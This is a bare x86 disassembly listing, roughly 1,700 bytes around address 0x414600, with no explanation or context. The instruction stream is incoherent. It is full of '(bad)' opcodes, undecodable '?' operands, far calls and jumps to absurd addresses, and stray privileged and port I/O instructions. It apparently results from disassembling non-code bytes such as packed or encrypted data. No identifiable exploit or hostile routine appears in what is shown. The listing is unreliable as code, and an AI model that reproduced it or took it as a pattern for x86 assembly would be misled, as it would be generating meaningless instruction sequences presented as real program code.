  414599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41459a:	mov    al,0x44
  41459c:	call   0xf8fa:0xbc09be25
  4145a3:	ss push edi
  4145a5:	push   edi
  4145a6:	sar    DWORD PTR [edi+0x4be610e6],0x39
  4145ad:	mov    esi,0xe08af2ad
  4145b2:	inc    ebx
  4145b3:	cdq    
  4145b4:	or     bl,BYTE PTR ds:0x8fdef28a
  4145ba:	jae    0x414624
  4145bc:	mov    esi,0x9c9f54d8
  4145c2:	jge    0x414550
  4145c4:	push   esp
  4145c5:	mov    ch,0x17
  4145c7:	and    al,0x40
  4145c9:	add    BYTE PTR [esp+ebp*1-0x38613b39],cl
  4145d0:	mov    DWORD PTR ss:[ebx+eiz*2],ecx
  4145d4:	xor    DWORD PTR [ebx],eax
  4145d6:	dec    esi
  4145d7:	mov    es,edx
  4145d9:	sbb    BYTE PTR [esi+0x61],dl
  4145dc:	je     0x41460f
  4145de:	dec    ecx
  4145e0:	pop    ss
  4145e1:	add    DWORD PTR [edi+ecx*4-0x3badd2ea],esp
  4145e8:	test   eax,0x29b1ae98
  4145ed:	shr    ecx,0x6a
  4145f0:	pop    ds
  4145f1:	mov    eax,0xbfd3d59a
  4145f6:	rol    BYTE PTR [eax-0x77],cl
  4145f9:	inc    esi
  4145fa:	dec    eax
  4145fb:	scas   al,BYTE PTR es:[edi]
  4145fc:	mov    al,ds:0x4102b4ce
  414601:	jg     0x41460d
  414603:	and    BYTE PTR [eax+0x56437269],bh
  414609:	sbb    DWORD PTR [esi+0x2bc5f199],eax
  41460f:	push   0xa4f1469d
  414614:	lock shr DWORD PTR [eax+0x2a],cl
  414618:	sbb    al,0xaf
  41461a:	pop    ecx
  41461b:	xchg   edx,eax
  41461c:	repz jmp 0x8a04d9c1
  414622:	loop   0x414658
  414624:	and    ch,BYTE PTR [ebp+0x9036d84]
  41462a:	(bad)  
  41462b:	sbb    al,0x56
  41462d:	push   esi
  41462e:	and    esi,DWORD PTR [edx-0x496fef5]
  414634:	cmc    
  414635:	fcomp  QWORD PTR [ecx+0x1dd78f23]
  41463b:	mov    edi,0xd40742c8
  414640:	adc    esp,esp
  414642:	mov    bh,0x25
  414644:	mov    cl,0xd1
  414646:	push   ss
  414647:	and    esp,DWORD PTR [ecx]
  414649:	(bad)  
  41464a:	or     edx,DWORD PTR [eax+0x69cc90ab]
  414650:	cmp    al,0xf4
  414652:	xchg   DWORD PTR [edi+0x1f],edi
  414655:	iret   
  414656:	mov    ah,0x84
  414658:	jp     0x4145e6
  41465a:	mul    BYTE PTR [ebx]
  41465c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41465e:	pop    ecx
  41465f:	xor    ch,BYTE PTR [esi-0x2d5b7d10]
  414665:	jbe    0x414670
  414667:	scas   al,BYTE PTR es:[edi]
  414668:	(bad)  
  414669:	std    
  41466a:	dec    ecx
  41466b:	into   
  41466c:	nop
  41466d:	test   al,0xf2
  41466f:	mov    es,WORD PTR [ebx+0x3a]
  414672:	pushf  
  414673:	in     eax,dx
  414674:	mov    WORD PTR [eax],?
  414676:	scas   eax,DWORD PTR es:[edi]
  414677:	cli    
  414678:	jmp    0x4146f7
  41467a:	xor    al,0xab
  41467c:	inc    edi
  41467d:	xor    DWORD PTR ds:0xbbc333ec,edx
  414683:	gs mov esp,0x439eb168
  414689:	jle    0x41466f
  41468b:	lods   eax,DWORD PTR ds:[esi]
  41468c:	mov    ebx,0x887f0fc4
  414691:	cmp    al,0x83
  414693:	or     eax,0xa7bd36b4
  414698:	pushf  
  414699:	je     0x4146d1
  41469b:	and    al,0x26
  41469d:	mov    cl,0xde
  41469f:	cdq    
  4146a0:	pop    ss
  4146a1:	and    eax,0x71d04c85
  4146a6:	mov    esp,0xa19614c7
  4146ab:	mov    gs,WORD PTR [ecx-0x709cd4a2]
  4146b1:	push   ds
  4146b2:	sub    DWORD PTR [ecx-0x37090ab4],0x9
  4146b9:	jb     0x4146c3
  4146bb:	or     esp,0x4328c495
  4146c1:	mov    gs,WORD PTR [edx-0x3d]
  4146c4:	cmp    cl,0x9e
  4146c7:	ja     0x41471e
  4146c9:	adc    al,0xa8
  4146cb:	mov    ah,bl
  4146cd:	xchg   esi,eax
  4146ce:	cmp    DWORD PTR [edi],esp
  4146d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146d1:	test   eax,0xbd1be614
  4146d6:	retf   
  4146d7:	and    BYTE PTR [ecx],bh
  4146d9:	xor    al,0x28
  4146db:	rcl    cl,0xd
  4146de:	xchg   edx,eax
  4146df:	(bad)  
  4146e0:	aad    0x97
  4146e2:	sbb    dh,BYTE PTR [eax+0x49]
  4146e5:	or     eax,0x44ceadfa
  4146ea:	stos   BYTE PTR es:[edi],al
  4146eb:	rcl    DWORD PTR [ebx+0x6e],1
  4146ee:	mov    dh,0xc0
  4146f0:	jge    0x414701
  4146f2:	mov    ecx,0xee085607
  4146f7:	xor    eax,0x7c
  4146fa:	push   ebx
  4146fb:	jo     0x4146f7
  4146fd:	enter  0xd76c,0x6c
  414701:	sbb    ch,ah
  414703:	sbb    DWORD PTR [eax],eax
  414705:	xor    edx,DWORD PTR [ecx+0x3]
  414708:	rcl    DWORD PTR ds:0x82233997,cl
  41470e:	mov    dh,0x83
  414710:	popa   
  414711:	retf   
  414712:	(bad)  
  414713:	aas    
  414714:	inc    esi
  414715:	mov    ebp,0xef880fb2
  41471a:	push   ss
  41471b:	mov    BYTE PTR [ebp-0x3cd751a],dl
  414721:	pop    ecx
  414722:	(bad)  
  414723:	nop
  414724:	shl    BYTE PTR [ebp-0x45],cl
  414727:	cmc    
  414728:	or     ecx,DWORD PTR [ebx-0x49]
  41472b:	and    bh,BYTE PTR [edi]
  41472d:	add    ah,dl
  41472f:	(bad)  
  414730:	std    
  414731:	push   es
  414732:	ins    BYTE PTR es:[edi],dx
  414733:	ret    0x6144
  414736:	mov    ds:0x2e0d28ac,al
  41473b:	shl    DWORD PTR [edx-0x6160aa2b],0x71
  414742:	xchg   edx,eax
  414743:	popa   
  414744:	xchg   edi,eax
  414745:	ret    0x5c18
  414748:	scas   al,BYTE PTR es:[edi]
  414749:	add    ebx,DWORD PTR [edi-0x2f]
  41474c:	hlt    
  41474d:	push   ebx
  41474e:	mov    al,ds:0xe899cdb9
  414753:	xchg   esp,eax
  414754:	scas   al,BYTE PTR es:[edi]
  414755:	ror    DWORD PTR [esi+0x8],0x8c
  414759:	jno    0x4147bc
  41475b:	jae    0x414720
  41475d:	shl    BYTE PTR [edi+ebx*1+0x226512cd],0xd
  414765:	mov    al,ds:0x742e1f82
  41476a:	fist   DWORD PTR [edi+0x41b18d64]
  414770:	sti    
  414771:	mov    dl,0xb0
  414773:	push   ds
  414774:	jno    0x4147a0
  414776:	add    ecx,DWORD PTR [edx+0x55]
  414779:	cmp    cl,dh
  41477b:	lock or BYTE PTR [ecx-0x4524eca9],ch
  414782:	pop    ecx
  414783:	loopne 0x41476a
  414785:	xor    ah,BYTE PTR [edx-0x6454031e]
  41478b:	ins    BYTE PTR es:[edi],dx
  41478c:	cs mov bl,0xd
  41478f:	push   eax
  414790:	mov    ebp,0x5e84bfc1
  414795:	ss cmp esp,esi
  414798:	xor    al,0x2e
  41479a:	pop    ss
  41479b:	mov    edx,edx
  41479d:	mov    ds:0x5ae6ec36,eax
  4147a2:	aad    0xe5
  4147a4:	repz mov bl,0x1
  4147a7:	mov    edi,0x83f67397
  4147ac:	test   BYTE PTR [esi-0x12],dh
  4147af:	sub    eax,DWORD PTR [edi-0xba3f30d]
  4147b5:	cs inc eax
  4147b7:	mov    WORD PTR [edi+eax*2+0x5d995fff],ds
  4147be:	xor    DWORD PTR [esp+eax*2-0x2217ee2d],ebx
  4147c5:	outs   dx,BYTE PTR ds:[esi]
  4147c6:	arpl   WORD PTR [edi-0x28],di
  4147c9:	int3   
  4147ca:	pop    ss
  4147cb:	sub    BYTE PTR [edx-0x3],dl
  4147ce:	mov    fs,WORD PTR [ebx]
  4147d0:	or     bl,BYTE PTR [ebx+0x3c1b5c6]
  4147d6:	xor    BYTE PTR [eax+edx*4],ah
  4147d9:	mov    bh,dl
  4147db:	jne    0x4147a2
  4147dd:	cdq    
  4147de:	in     al,dx
  4147df:	mov    eax,0xe6645bb3
  4147e4:	xchg   esi,eax
  4147e5:	daa    
  4147e6:	jns    0x41485d
  4147e8:	aam    0x34
  4147ea:	push   ebp
  4147eb:	mov    ah,0x7e
  4147ed:	pop    edi
  4147ee:	jns    0x414771
  4147f0:	mov    ecx,0x70c4aacf
  4147f5:	(bad)  
  4147f6:	mov    esp,0x19277ccc
  4147fb:	sub    BYTE PTR [edi],al
  4147fd:	stos   DWORD PTR es:[edi],eax
  4147fe:	int3   
  4147ff:	or     al,0x10
  414801:	sbb    dh,BYTE PTR [ecx-0x7e66cb95]
  414807:	dec    esi
  414808:	jge    0x414830
  41480a:	add    dl,BYTE PTR [ebx+0x79]
  41480d:	push   ebx
  41480e:	out    dx,eax
  41480f:	mov    esi,0x8330d4d5
  414814:	fdivr  st,st(3)
  414816:	xchg   ebx,eax
  414817:	call   0xcc6145bf
  41481c:	outs   dx,DWORD PTR ds:[esi]
  41481d:	test   BYTE PTR [ecx-0x6],ch
  414820:	fdiv   DWORD PTR ss:[edi-0x3b]
  414824:	nop
  414825:	in     eax,0xff
  414827:	pusha  
  414828:	mov    edx,0xb5d4b444
  41482d:	xor    dh,BYTE PTR [ebp-0x13]
  414830:	sub    al,0xe1
  414832:	mov    ch,0xf3
  414834:	push   ebp
  414835:	inc    edi
  414836:	and    BYTE PTR [ecx+edx*1+0x53bb650f],dh
  41483d:	sbb    eax,0x4aba0077
  414842:	(bad)  
  414843:	cmp    cl,BYTE PTR [edi]
  414845:	loop   0x4147c7
  414847:	mov    eax,0x8789b377
  41484c:	dec    eax
  41484d:	jo     0x4148b4
  41484f:	ja     0x414883
  414851:	adc    eax,0x5e40ae66
  414856:	ret    0x5df8
  414859:	call   0x25d9c65a
  41485e:	dec    ebp
  41485f:	cdq    
  414860:	shl    BYTE PTR [esi+eax*1+0x146b625],cl
  414867:	inc    edi
  414868:	or     BYTE PTR [eax-0x4f897364],bh
  41486e:	cdq    
  41486f:	pop    esi
  414870:	(bad)  
  414872:	bound  ebx,QWORD PTR [ebx+ebx*4-0xd9a1878]
  414879:	push   ss
  41487a:	fidiv  DWORD PTR [ebx+0x42beadb3]
  414880:	jne    0x414852
  414882:	adc    edx,DWORD PTR [esi+0x354d77b6]
  414888:	ins    DWORD PTR es:[edi],dx
  414889:	push   edi
  41488a:	retf   
  41488b:	lea    edi,[eax]
  41488d:	into   
  41488e:	xchg   BYTE PTR [esi+0x68],dl
  414891:	aaa    
  414892:	mov    ?,WORD PTR [esi+edx*1+0x3a]
  414896:	dec    esp
  414897:	push   esi
  414898:	call   0x40945fa9
  41489d:	sahf   
  41489e:	pop    ebx
  41489f:	or     dl,BYTE PTR [edi+0x570aa044]
  4148a5:	int    0xe3
  4148a7:	xor    cl,bl
  4148a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148aa:	stos   DWORD PTR es:[edi],eax
  4148ab:	add    ch,BYTE PTR [ecx]
  4148ad:	inc    ebp
  4148ae:	das    
  4148af:	je     0x4148df
  4148b1:	pop    esi
  4148b2:	fstp   TBYTE PTR [esi+ebx*1-0x78e90651]
  4148b9:	sahf   
  4148ba:	imul   edx,DWORD PTR [edx],0x7
  4148bd:	mov    ?,WORD PTR [edi+edi*2]
  4148c0:	mov    esp,?
  4148c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148c3:	(bad)  
  4148c4:	dec    ecx
  4148c5:	mov    ecx,ecx
  4148c7:	push   0x6d11075a
  4148cc:	mov    esi,0x9a49c0ba
  4148d1:	adc    DWORD PTR ds:0x2d099d26,edi
  4148d7:	push   cs
  4148d8:	xchg   edx,eax
  4148d9:	xchg   BYTE PTR [eax],bl
  4148db:	or     DWORD PTR ss:[ecx+eiz*8+0x5d65ee21],esp
  4148e3:	out    0xfe,eax
  4148e5:	popa   
  4148e6:	inc    edi
  4148e7:	mov    bl,0xce
  4148e9:	(bad)
  4148ed:	retf   0xe5e5
  4148f0:	xchg   edi,eax
  4148f1:	mov    bl,al
  4148f3:	sub    BYTE PTR [ecx+0x15],cl
  4148f6:	call   ecx
  4148f8:	test   DWORD PTR [eax+esi*8],edi
  4148fb:	add    BYTE PTR [esi-0x5ae68650],al
  414901:	jg     0x4148dc
  414903:	scas   eax,DWORD PTR es:[edi]
  414904:	mov    edi,DWORD PTR [eax-0x41f02f9c]
  41490a:	push   ds
  41490b:	add    DWORD PTR [edi-0x24],edi
  41490e:	adc    al,0xff
  414910:	sahf   
  414911:	xchg   DWORD PTR [edi],edi
  414913:	aaa    
  414914:	enter  0x2066,0xa1
  414918:	and    BYTE PTR fs:[ebp+0x120b173a],bh
  41491f:	cmp    eax,0x9fe41900
  414924:	cmp    al,0xf4
  414926:	outs   dx,DWORD PTR ds:[esi]
  414927:	cmp    eax,DWORD PTR [ebp+0x5d]
  41492a:	(bad)
  41492d:	hlt    
  41492e:	neg    dl
  414930:	mov    eax,0xe9feb6c6
  414935:	mov    al,ds:0x5a94977e
  41493a:	jbe    0x41492d
  41493c:	out    0xb7,al
  41493e:	enter  0x5f25,0xf2
  414942:	(bad)  
  414943:	data16 scas al,BYTE PTR es:[edi]
  414945:	cmc    
  414946:	mov    ds:0x545f17c6,eax
  41494b:	cmp    BYTE PTR ds:0x4bbd2583,ch
  414951:	jae    0x41494f
  414953:	loopne 0x41498d
  414955:	addr16 adc eax,0x25c3cfc5
  41495b:	sbb    DWORD PTR [ecx],ebp
  41495d:	mov    ds:0xc8b976fb,eax
  414962:	retf   0x19e3
  414965:	cmp    dl,BYTE PTR [ecx+0x6d2a9f66]
  41496b:	jno    0x4148fd
  41496d:	jp     0x41492c
  41496f:	(bad)  
  414970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414971:	mov    al,ds:0x52f720a4
  414976:	inc    edi
  414977:	mov    dh,0x5
  414979:	das    
  41497a:	mov    ds,WORD PTR [ecx]
  41497c:	xchg   ebx,eax
  41497d:	nop
  41497e:	cld    
  41497f:	jmp    0x60cbffe5
  414984:	stos   DWORD PTR es:[edi],eax
  414985:	jno    0x4149e0
  414987:	jne    0x414979
  414989:	and    ch,BYTE PTR [edx+0x61]
  41498c:	call   0xcac7:0x58fa8351
  414993:	int3   
  414994:	std    
  414995:	outs   dx,BYTE PTR ds:[esi]
  414996:	shl    DWORD PTR [ebx-0x1d78134],0x5d
  41499d:	jne    0x4149ec
  41499f:	jle    0x4149b5
  4149a1:	and    DWORD PTR [edi+0x7084fdcc],edx
  4149a7:	xchg   esp,eax
  4149a8:	std    
  4149a9:	fmul   DWORD PTR [edx+ebp*1]
  4149ac:	icebp  
  4149ad:	push   ss
  4149ae:	cmc    
  4149af:	xor    eax,ebp
  4149b1:	dec    ebp
  4149b2:	lds    edi,FWORD PTR [edx-0x35]
  4149b5:	sub    eax,0x9078a4a2
  4149ba:	pop    es
  4149bb:	xchg   esp,eax
  4149bc:	imul   eax,DWORD PTR [edx-0x15],0x61bd0440
  4149c3:	add    al,0xb9
  4149c5:	in     al,dx
  4149c6:	nop
  4149c7:	cmp    BYTE PTR [edi+edi*8+0x545e5530],dh
  4149ce:	imul   esi,DWORD PTR [esi],0xcdbcf36b
  4149d4:	mov    ds:0xd9500f8a,eax
  4149d9:	in     eax,0x57
  4149db:	jmp    0x6ecd1fc5
  4149e0:	add    al,0x76
  4149e2:	repz push 0xffffff88
  4149e5:	mov    ds:0xccede3f2,al
  4149ea:	xchg   esp,eax
  4149eb:	push   ds
  4149ec:	sub    ebx,eax
  4149ee:	pop    edx
  4149ef:	mov    esp,0xadf12129
  4149f4:	mov    edi,0x88a239c8
  4149f9:	mov    esi,0x13f87d7f
  4149fe:	test   al,0x7d
  414a00:	mov    al,0xb5
  414a02:	lods   al,BYTE PTR ds:[esi]
  414a03:	mov    ebx,0x87148019
  414a08:	stos   BYTE PTR es:[edi],al
  414a09:	mov    esi,0xd87d52e
  414a0e:	adc    dh,BYTE PTR [ecx+esi*8+0x30]
  414a12:	mov    ds:0x1b515987,al
  414a17:	cmp    ebp,DWORD PTR [eax+0x7f]
  414a1a:	vorps  xmm1,xmm2,XMMWORD PTR [edx-0x5253f477]
  414a22:	push   esi
  414a23:	rol    DWORD PTR [edx],1
  414a25:	inc    ebx
  414a26:	arpl   WORD PTR [eax-0x3c],dx
  414a29:	xor    BYTE PTR [edx-0x548488d7],ch
  414a2f:	ficom  WORD PTR [eax-0x61]
  414a32:	outs   dx,BYTE PTR ds:[esi]
  414a33:	dec    edx
  414a34:	dec    ebx
  414a35:	imul   eax,DWORD PTR [eax+0x4f729e17],0xfffffff1
  414a3c:	rcr    BYTE PTR [edx],cl
  414a3e:	mov    dh,0xa8
  414a40:	ret    
  414a41:	mov    ah,0x4f
  414a43:	dec    ecx
  414a44:	pop    ebx
  414a45:	enter  0x9e14,0xa9
  414a49:	push   eax
  414a4a:	push   ecx
  414a4b:	push   ebx
  414a4c:	mov    ah,BYTE PTR [esi-0x5c]
  414a4f:	addr16 inc edi
  414a51:	gs dec esi
  414a53:	je     0x414a3a
  414a55:	frstor [ecx-0x55074eca]
  414a5b:	ja     0x414aae
  414a5d:	popa   
  414a5e:	and    esi,0x8702b3da
  414a64:	jecxz  0x414a2e
  414a66:	repnz cmp edi,eax
  414a69:	adc    eax,0x9e7c0a85
  414a6e:	(bad)  
  414a6f:	imul   ebx,DWORD PTR [eax+0x39],0x634edc01
  414a76:	mov    eax,0xe3b526c8
  414a7b:	pusha  
  414a7c:	jno    0x414a14
  414a7e:	mov    cl,0xb9
  414a80:	jno    0x414a93
  414a82:	aam    0x59
  414a84:	xor    ah,BYTE PTR [esi-0x22]
  414a87:	fwait
  414a88:	rcr    BYTE PTR [ebp+0x68],cl
  414a8b:	jp     0x414a3b
  414a8d:	jl     0x414a12
  414a8f:	or     al,0xab
  414a91:	xchg   ebx,eax
  414a92:	mov    esp,0xf53cd26
  414a97:	cwde   
  414a98:	fisttp QWORD PTR cs:[esi-0x28]
  414a9c:	data16 mov bh,bh
  414a9f:	xor    DWORD PTR [edi-0x1a],ebx
  414aa2:	test   eax,0xffeed00
  414aa7:	cs xor edi,edx
  414aaa:	pop    es
  414aab:	fild   DWORD PTR [edx-0x8c5738c]
  414ab1:	retf   0xf478
  414ab4:	push   edi
  414ab5:	push   ecx
  414ab6:	push   ebx
  414ab7:	cdq    
  414ab8:	stos   DWORD PTR es:[edi],eax
  414ab9:	and    esi,DWORD PTR [ecx]
  414abb:	push   ss
  414abc:	mov    edi,DWORD PTR [ebx+0x5]
  414abf:	loopne 0x414ac1
  414ac1:	imul   edi,ecx,0xf3335f77
  414ac7:	pop    ds
  414ac8:	aaa    
  414ac9:	cs sub ah,al
  414acc:	ficom  WORD PTR [edx-0x71896536]
  414ad2:	ror    BYTE PTR [eax],cl
  414ad4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ad5:	xor    ebp,DWORD PTR [edx+0x4c26baf2]
  414adb:	dec    esp
  414add:	fisub  DWORD PTR [edi+esi*2+0x78e57a56]
  414ae4:	mov    WORD PTR [ebx],ds
  414ae6:	std    
  414ae7:	dec    esp
  414ae8:	xlat   BYTE PTR ds:[ebx]
  414ae9:	pop    ds
  414aea:	cld    
  414aeb:	ins    BYTE PTR es:[edi],dx
  414aec:	sti    
  414aed:	cmp    al,0xc4
  414aef:	push   ecx
  414af0:	repz (bad) 
  414af2:	int    0x63
  414af4:	dec    DWORD PTR [ebx+esi*8]
  414af7:	out    dx,al
  414af8:	or     eax,0xbe0ac2e7
  414afd:	retf   
  414afe:	rcr    DWORD PTR [edx-0x7c],1
  414b01:	or     BYTE PTR [eax],ch
  414b03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b04:	push   es
  414b05:	dec    ecx
  414b06:	fisttp QWORD PTR [ecx-0x23e13b8]
  414b0c:	push   esi
  414b0d:	mov    ch,0x41
  414b0f:	xor    cl,BYTE PTR [eax+0x817de3f]
  414b15:	pop    ebx
  414b16:	int3   
  414b17:	ret    0xcaba
  414b1a:	mov    ebx,0x135e5488
  414b1f:	jle    0x414ae9
  414b21:	jb     0x414adb
  414b23:	push   ecx
  414b24:	test   BYTE PTR [edx+edi*8],al
  414b27:	mov    ebx,fs
  414b29:	fadd   QWORD PTR [esi+0x74]
  414b2c:	cs push esp
  414b2e:	pop    edx
  414b2f:	in     eax,dx
  414b30:	push   ecx
  414b31:	test   al,0x90
  414b33:	and    ecx,eax
  414b35:	mov    eax,0xd4ad14df
  414b3a:	add    dh,BYTE PTR [ebp+0x58834823]
  414b40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b41:	pop    DWORD PTR [edx-0x2b]
  414b44:	bound  edi,QWORD PTR [ebp+0x2d]
  414b47:	ins    DWORD PTR es:[edi],dx
  414b48:	mov    ds:0xf27e379a,al
  414b4d:	pop    ds
  414b4e:	add    eax,0x3d11250f
  414b53:	and    al,0x32
  414b55:	out    0xb1,eax
  414b57:	push   ebp
  414b58:	inc    ebx
  414b59:	(bad)  
  414b5a:	cwde   
  414b5b:	mov    cl,0x76
  414b5d:	dec    eax
  414b5e:	jb     0x414b07
  414b60:	test   al,0xe9
  414b62:	repnz test eax,0x6e8927f7
  414b68:	aaa    
  414b69:	cmovge esp,edi
  414b6c:	adc    DWORD PTR [edi],eax
  414b6e:	push   es
  414b6f:	mov    edx,0xf8b20d76
  414b74:	stc    
  414b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b76:	pop    ds
  414b77:	inc    edx
  414b78:	aas    
  414b79:	mov    ecx,0xadb17031
  414b7e:	mov    esp,0x90774652
  414b83:	sbb    cl,bh
  414b85:	push   ds
  414b86:	cmp    bl,ah
  414b88:	mov    eax,ds:0xed546450
  414b8d:	xor    al,0x8
  414b8f:	xlat   BYTE PTR ds:[ebx]
  414b90:	sbb    al,0xc
  414b92:	inc    ebx
  414b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b94:	push   edx
  414b95:	fucom  st(5)
  414b97:	jb     0x414b60
  414b99:	xor    DWORD PTR [eax-0x2495ba28],0x3ada0968
  414ba3:	sub    al,0x77
  414ba5:	cmc    
  414ba6:	pop    eax
  414ba7:	mov    ebx,0xf60adac9
  414bac:	loope  0x414c10
  414bae:	repnz dec ebx
  414bb0:	bound  ebx,QWORD PTR [ebx-0x4eb2a6a9]
  414bb6:	jle    0x414c24
  414bb8:	(bad)  
  414bb9:	lea    edi,[ecx-0x3da60e2]
  414bbf:	adc    BYTE PTR [esi+0x9884d76],ch
  414bc5:	jmp    0xff10:0x16a7a79a
  414bcc:	mov    al,ds:0x1e549700
  414bd1:	ret    
  414bd2:	das    
  414bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bd4:	inc    edi
  414bd5:	mov    ah,0x90
  414bd7:	stc    
  414bd8:	cs pusha 
  414bda:	sbb    dl,BYTE PTR [edi+0x5fd571e4]
  414be0:	enter  0x212f,0x7
  414be4:	js     0x414bd9
  414be6:	ret    
  414be7:	push   ebp
  414be8:	jg     0x414bed
  414bea:	jnp    0x414c43
  414bec:	mov    ebx,0x5f718723
  414bf1:	pop    ebp
  414bf2:	int3   
  414bf3:	pop    ss
  414bf4:	adc    DWORD PTR [ebx-0x8],eax
  414bf7:	fnstsw WORD PTR [edi]
  414bf9:	fucomp st(4)
  414bfb:	mov    esi,0x10cca885
  414c00:	mul    edi
  414c02:	push   ecx
  414c03:	xor    edx,0x873b6454
  414c09:	ins    DWORD PTR es:[edi],dx
  414c0a:	xor    DWORD PTR [eax+0x1da87ead],0x3a6a3070
  414c14:	xor    al,0xe8
  414c16:	outs   dx,BYTE PTR ds:[esi]
  414c17:	dec    edx
  414c18:	inc    ecx
  414c19:	std    
  414c1a:	dec    edi
  414c1b:	lods   eax,DWORD PTR ds:[esi]
  414c1c:	add    ebx,DWORD PTR [ebx+0x6bacd86c]
  414c22:	(bad)  
  414c23:	aas    
  414c24:	(bad)
  414c29:	mov    ss,WORD PTR [edi+0x29766876]
  414c2f:	mov    eax,ds:0xa3a49284
  414c34:	(bad)  
  414c35:	repnz (bad) 
  414c37:	in     eax,dx
  414c38:	and    al,0x67
  414c3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c3b:	and    al,0x17
  414c3d:	lods   al,BYTE PTR ds:[esi]
  414c3e:	retf   0xcb27
  414c41:	cmp    esi,esp
  414c43:	out    0x83,al
  414c45:	(bad)  
  414c47:	push   ss
  414c48:	sbb    eax,DWORD PTR [eax]
  414c4a:	sub    eax,0xec9c2381
  414c4f:	mov    dh,0xef
  414c51:	ror    DWORD PTR [esi],cl
  414c53:	pushf  
  414c54:	lock outs dx,DWORD PTR ds:[esi]
  414c56:	mov    BYTE PTR [ecx+0x1a49eb6e],bh
  414c5c:	inc    ecx
  414c5d:	call   0x661aa74b
  414c62:	jp     0x414cac
  414c64:	xchg   esp,eax
  414c65:	mov    es,WORD PTR [ebx]
  414c67:	jbe    0x414cbb
  414c69:	sbb    ebx,DWORD PTR [edi-0x52]
  414c6c:	cld    
  414c6d:	hlt    
  414c6e:	xor    esi,ecx
  414c70:	adc    DWORD PTR [ebp-0x20a73df0],ebx
  414c76:	mov    dh,BYTE PTR cs:[ebx]
  414c79:	xlat   BYTE PTR ds:[ebx]
  414c7a:	test   al,0x67
  414c7c:	push   edx
  414c7d:	addr16 mov dh,0x52
  414c80:	pushf  
  414c81:	repz cs jmp 0x414c6b
  414c85:	call   0x98b3:0x895825e9
  414c8c:	pop    edi
  414c8d:	hlt    
  414c8e:	and    al,0x6c
  414c90:	pushf  
  414c91:	jbe    0x414c7c
  414c93:	test   DWORD PTR [edi-0xc687e],ebp
  414c99:	fnstsw WORD PTR [eax]
  414c9b:	ds push ds
  414c9d:	sub    al,0x37
  414c9f:	lock mov edx,0xc16ffbfe
  414ca5:	dec    edx
  414ca6:	and    al,0x5b
  414ca8:	xchg   ebp,eax
  414ca9:	and    dh,BYTE PTR [ebp+0x4cd9ce15]
  414caf:	jo     0x414cee
  414cb1:	pusha  
  414cb2:	pop    ebp
  414cb3:	and    eax,0x96c12db2
  414cb8:	mov    bh,0x15
  414cba:	xchg   ebp,eax
  414cbb:	(bad)  
  414cbc:	sub    edi,DWORD PTR ds:0x4e331379
  414cc2:	adc    DWORD PTR [ecx+0x4f],0x3bf834af
  414cc9:	test   DWORD PTR [edx],esi
  414ccb:	jge    0x414d06
  414ccd:	(bad)  
  414cce:	push   edi
  414ccf:	int3   
  414cd0:	pushf  
  414cd1:	data16 clc 
  414cd3:	ins    DWORD PTR es:[edi],dx
  414cd4:	sbb    al,0x95
  414cd6:	jae    0x414cc6
  414cd8:	push   ebp
  414cd9:	xor    ebx,DWORD PTR [ebp+0x4520e611]
  414cdf:	rcl    BYTE PTR [eax+0xc],1
  414ce2:	mov    ebp,DWORD PTR [eax+0x22]
  414ce5:	ins    DWORD PTR es:[edi],dx
  414ce6:	xor    edi,DWORD PTR [esi+esi*2]
  414ce9:	or     cl,dl
  414ceb:	test   BYTE PTR [eax+0x44534fac],cl
  414cf1:	pop    ds
  414cf2:	xchg   ecx,eax
  414cf3:	pushf  
  414cf4:	jo     0x414ca1
  414cf6:	dec    edi
  414cf7:	fild   WORD PTR [edi-0x53f578dc]
  414cfd:	call   0x7a:0x71da1475
  414d04:	nop
  414d05:	or     dl,BYTE PTR [esi+0x77]
  414d08:	sbb    BYTE PTR [edx],bh
  414d0a:	ret    
  414d0b:	adc    BYTE PTR [edx+0x1f],dh
  414d0e:	pushf  
  414d0f:	jo     0x414d24
  414d11:	enter  0xc9e1,0x85
  414d15:	xor    al,0xab
  414d17:	sbb    DWORD PTR [ecx],esp
  414d19:	loope  0x414d53
  414d1b:	sbb    eax,0xb984c27e
  414d20:	add    dl,BYTE PTR [ebx*8-0x49620782]
  414d27:	jge    0x414d4e
  414d29:	adc    BYTE PTR [edx-0x11],0x9c
  414d2d:	retf   0x30b8
  414d30:	clc    
  414d31:	fdiv   DWORD PTR [eax-0x3837d9c]
  414d37:	sub    eax,DWORD PTR [esi]
  414d39:	retf   0x432f
  414d3c:	push   esp
  414d3d:	dec    sp
  414d3f:	sub    DWORD PTR [ecx],edi
  414d41:	in     eax,dx
  414d42:	and    al,0xd9
  414d44:	cli    
  414d45:	ins    BYTE PTR es:[edi],dx
  414d46:	push   cs
  414d47:	or     DWORD PTR gs:[eax+ecx*8-0x32],ecx
  414d4c:	daa    
  414d4d:	cmp    BYTE PTR [eax*4+0x12aff936],al
  414d54:	sbb    cl,bl
  414d56:	sub    DWORD PTR [eax],ecx
  414d58:	inc    edx
  414d59:	call   0x9049:0xf0800a7a
  414d60:	fwait
  414d61:	cdq    
  414d62:	cmp    edi,DWORD PTR [ebp-0x6b]
  414d65:	sti    
  414d66:	mov    eax,ds:0x3defbdb5
  414d6b:	mov    esp,0xeea036d0
  414d70:	mov    bh,0x43
  414d72:	sbb    al,0x52
  414d74:	jns    0x414d1e
  414d76:	(bad)  
  414d77:	outs   dx,DWORD PTR ds:[esi]
  414d78:	or     DWORD PTR [edx-0x75],0xdfc05179
  414d7f:	mov    bl,0xf9
  414d81:	out    dx,eax
  414d82:	cld    
  414d83:	ins    DWORD PTR es:[edi],dx
  414d84:	ret    
  414d85:	mov    bh,0x4d
  414d87:	sbb    BYTE PTR ds:0x8e1bbeba,ah
  414d8d:	ret    
  414d8e:	push   ebp
  414d8f:	adc    esi,edi
  414d91:	xchg   edi,eax
